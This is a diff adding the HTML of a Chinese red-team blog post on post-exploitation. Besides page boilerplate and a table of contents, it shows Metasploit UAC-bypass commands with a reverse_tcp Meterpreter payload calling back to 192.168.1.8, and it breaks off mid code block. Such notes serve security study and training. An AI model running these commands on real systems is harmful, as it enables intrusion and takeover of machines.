@@ -1,0 +1,1547 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>hvv_后渗透 - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="hvv_后渗透" />
+<meta property="og:description" content="1 权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+1.1 windows提权Windows常见权限分类：
+1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.1.1 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 1.1.2 2.msf提权1.1.2.1 2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
+（权限为Administrator时大概率会成功，其他可能需要绕UAC）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/hvv_post_penetration/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="hvv_后渗透"/>
+<meta name="twitter:description" content="1 权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+1.1 windows提权Windows常见权限分类：
+1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.1.1 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 1.1.2 2.msf提权1.1.2.1 2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
+（权限为Administrator时大概率会成功，其他可能需要绕UAC）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 1."/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hvv_post_penetration/" /><link rel="prev" href="http://scofield1920.github.io/hvv_emergency_response/" /><link rel="next" href="http://scofield1920.github.io/hvv_middleware_bug/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "hvv_后渗透",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, web, hvv","wordcount":  1691 ,
+        "url": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "scofied_lee"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#windows提权">windows提权</a>
+          <ul>
+            <li><a href="#1提权辅助脚本">1.提权辅助脚本</a></li>
+            <li><a href="#2msf提权">2.msf提权</a>
+              <ul>
+                <li><a href="#21-msf绕过uac提权">2.1 msf绕过UAC提权</a></li>
+                <li><a href="#22-suggester辅助脚本提权">2.2 suggester辅助脚本提权</a></li>
+                <li><a href="#23-烂土豆提权提权">2.3 烂土豆提权提权</a></li>
+                <li><a href="#24-dll劫持提权">2.4 DLL劫持提权</a></li>
+                <li><a href="#25-令牌窃取提权">2.5 令牌窃取提权</a></li>
+              </ul>
+            </li>
+            <li><a href="#3psexec提权">3.psexec提权</a></li>
+            <li><a href="#4注册表提权">4.注册表提权</a></li>
+          </ul>
+        </li>
+        <li><a href="#linux提权">Linux提权</a>
+          <ul>
+            <li><a href="#1-内核溢出提权">1 内核溢出提权</a></li>
+            <li><a href="#2sudo提权">2.sudo提权</a></li>
+            <li><a href="#3suid提权">3.suid提权</a></li>
+            <li><a href="#4su">4.su</a></li>
+            <li><a href="#5任务计划">5.任务计划</a></li>
+            <li><a href="#6覆盖passwd提权">6.覆盖passwd提权</a></li>
+            <li><a href="#7ssh密钥提权">7.ssh密钥提权</a></li>
+            <li><a href="#8john破解shadow-root密文登陆提权">8.john破解shadow root密文登陆提权</a></li>
+            <li><a href="#9ubuntu计划任务反弹shell提权">9.Ubuntu计划任务反弹shell提权</a></li>
+          </ul>
+        </li>
+        <li><a href="#数据库提权">数据库提权</a>
+          <ul>
+            <li><a href="#1mof提权">1.MOF提权</a></li>
+            <li><a href="#2udf提权">2.UDF提权</a></li>
+            <li><a href="#3mssql提权">3.Mssql提权</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#白银票据和黄金票据">白银票据和黄金票据</a>
+      <ul>
+        <li><a href="#kerberos认证流程">Kerberos认证流程</a></li>
+        <li><a href="#黄金票据">黄金票据</a></li>
+        <li><a href="#白银票据">白银票据</a></li>
+        <li><a href="#不同点">不同点</a>
+          <ul>
+            <li><a href="#获取的权限不同"><strong>获取的权限不同</strong>:</a></li>
+            <li><a href="#认证流程不同"><strong>认证流程不同</strong></a></li>
+            <li><a href="#加密方式不同"><strong>加密方式不同</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#权限维持">权限维持</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1反弹shell">1.反弹shell</a></li>
+            <li><a href="#2webshell">2.webshell</a></li>
+            <li><a href="#3系统后门">3.系统后门</a>
+              <ul>
+                <li><a href="#windows">Windows</a></li>
+                <li><a href="#linux">Linux</a></li>
+              </ul>
+            </li>
+            <li><a href="#4利用iis等服务制作后门">4.利用IIS等服务制作后门</a>
+              <ul>
+                <li><a href="#41-探测是否出网">4.1 探测是否出网</a></li>
+                <li><a href="#42-网络层常用隧道">4.2 网络层常用隧道</a></li>
+                <li><a href="#43-传输层常用隧道">4.3 传输层常用隧道</a></li>
+                <li><a href="#44-应用层常用隧道">4.4 应用层常用隧道</a></li>
+                <li><a href="#45-dnsiodine">4.5 DNS（iodine）</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#内网主机存活探测">内网主机存活探测</a>
+              <ul>
+                <li><a href="#1icmp">1.ICMP</a></li>
+                <li><a href="#2nmap">2.nmap</a></li>
+              </ul>
+            </li>
+            <li><a href="#内网主机端口探测">内网主机端口探测</a>
+              <ul>
+                <li><a href="#1单个端口探测">1.单个端口探测</a></li>
+                <li><a href="#2多个端口探测">2.多个端口探测</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#横向移动方法">横向移动方法：</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hvv_后渗透</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">scofied_lee</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/penetration/"><i class="far fa-folder fa-fw"></i>penetration</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1691 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#windows提权">windows提权</a>
+          <ul>
+            <li><a href="#1提权辅助脚本">1.提权辅助脚本</a></li>
+            <li><a href="#2msf提权">2.msf提权</a>
+              <ul>
+                <li><a href="#21-msf绕过uac提权">2.1 msf绕过UAC提权</a></li>
+                <li><a href="#22-suggester辅助脚本提权">2.2 suggester辅助脚本提权</a></li>
+                <li><a href="#23-烂土豆提权提权">2.3 烂土豆提权提权</a></li>
+                <li><a href="#24-dll劫持提权">2.4 DLL劫持提权</a></li>
+                <li><a href="#25-令牌窃取提权">2.5 令牌窃取提权</a></li>
+              </ul>
+            </li>
+            <li><a href="#3psexec提权">3.psexec提权</a></li>
+            <li><a href="#4注册表提权">4.注册表提权</a></li>
+          </ul>
+        </li>
+        <li><a href="#linux提权">Linux提权</a>
+          <ul>
+            <li><a href="#1-内核溢出提权">1 内核溢出提权</a></li>
+            <li><a href="#2sudo提权">2.sudo提权</a></li>
+            <li><a href="#3suid提权">3.suid提权</a></li>
+            <li><a href="#4su">4.su</a></li>
+            <li><a href="#5任务计划">5.任务计划</a></li>
+            <li><a href="#6覆盖passwd提权">6.覆盖passwd提权</a></li>
+            <li><a href="#7ssh密钥提权">7.ssh密钥提权</a></li>
+            <li><a href="#8john破解shadow-root密文登陆提权">8.john破解shadow root密文登陆提权</a></li>
+            <li><a href="#9ubuntu计划任务反弹shell提权">9.Ubuntu计划任务反弹shell提权</a></li>
+          </ul>
+        </li>
+        <li><a href="#数据库提权">数据库提权</a>
+          <ul>
+            <li><a href="#1mof提权">1.MOF提权</a></li>
+            <li><a href="#2udf提权">2.UDF提权</a></li>
+            <li><a href="#3mssql提权">3.Mssql提权</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#白银票据和黄金票据">白银票据和黄金票据</a>
+      <ul>
+        <li><a href="#kerberos认证流程">Kerberos认证流程</a></li>
+        <li><a href="#黄金票据">黄金票据</a></li>
+        <li><a href="#白银票据">白银票据</a></li>
+        <li><a href="#不同点">不同点</a>
+          <ul>
+            <li><a href="#获取的权限不同"><strong>获取的权限不同</strong>:</a></li>
+            <li><a href="#认证流程不同"><strong>认证流程不同</strong></a></li>
+            <li><a href="#加密方式不同"><strong>加密方式不同</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#权限维持">权限维持</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1反弹shell">1.反弹shell</a></li>
+            <li><a href="#2webshell">2.webshell</a></li>
+            <li><a href="#3系统后门">3.系统后门</a>
+              <ul>
+                <li><a href="#windows">Windows</a></li>
+                <li><a href="#linux">Linux</a></li>
+              </ul>
+            </li>
+            <li><a href="#4利用iis等服务制作后门">4.利用IIS等服务制作后门</a>
+              <ul>
+                <li><a href="#41-探测是否出网">4.1 探测是否出网</a></li>
+                <li><a href="#42-网络层常用隧道">4.2 网络层常用隧道</a></li>
+                <li><a href="#43-传输层常用隧道">4.3 传输层常用隧道</a></li>
+                <li><a href="#44-应用层常用隧道">4.4 应用层常用隧道</a></li>
+                <li><a href="#45-dnsiodine">4.5 DNS（iodine）</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#内网主机存活探测">内网主机存活探测</a>
+              <ul>
+                <li><a href="#1icmp">1.ICMP</a></li>
+                <li><a href="#2nmap">2.nmap</a></li>
+              </ul>
+            </li>
+            <li><a href="#内网主机端口探测">内网主机端口探测</a>
+              <ul>
+                <li><a href="#1单个端口探测">1.单个端口探测</a></li>
+                <li><a href="#2多个端口探测">2.多个端口探测</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#横向移动方法">横向移动方法：</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="权限提升" class="headerLink">
+    <a href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="header-mark"></a>1 权限提升</h2><p>通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。</p>
+<h3 id="windows提权" class="headerLink">
+    <a href="#windows%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1 windows提权</h3><p>Windows常见权限分类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*   User：普通用户权限；
+</span></span><span class="line"><span class="cl">*   Administrator：管理员权限；
+</span></span><span class="line"><span class="cl">*   System：系统权限。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="1提权辅助脚本" class="headerLink">
+    <a href="#1%e6%8f%90%e6%9d%83%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac" class="header-mark"></a>1.1.1 1.提权辅助脚本</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权；
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2msf提权" class="headerLink">
+    <a href="#2msf%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2 2.msf提权</h4><h5 id="21-msf绕过uac提权" class="headerLink">
+    <a href="#21-msf%e7%bb%95%e8%bf%87uac%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.1 2.1 msf绕过UAC提权</h5><p>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</p>
+<p>（权限为Administrator时大概率会成功，其他可能需要绕UAC）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">①进程注入方式</span><span class="n">UAC</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">session</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span><span class="line"><span class="cl"><span class="err">在执行</span><span class="n">getsystem</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="err">②内存注入</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac_injection</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">session</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span><span class="line"><span class="cl"><span class="err">在执行</span><span class="n">getsystem</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="err">③</span><span class="n">Eventvwr注册表项</span> 
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac_eventvwr</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="err">④</span><span class="n">COM处理程序劫持</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac_comhijack</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="22-suggester辅助脚本提权" class="headerLink">
+    <a href="#22-suggester%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.2 2.2 suggester辅助脚本提权</h5><p>会话派发到msf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
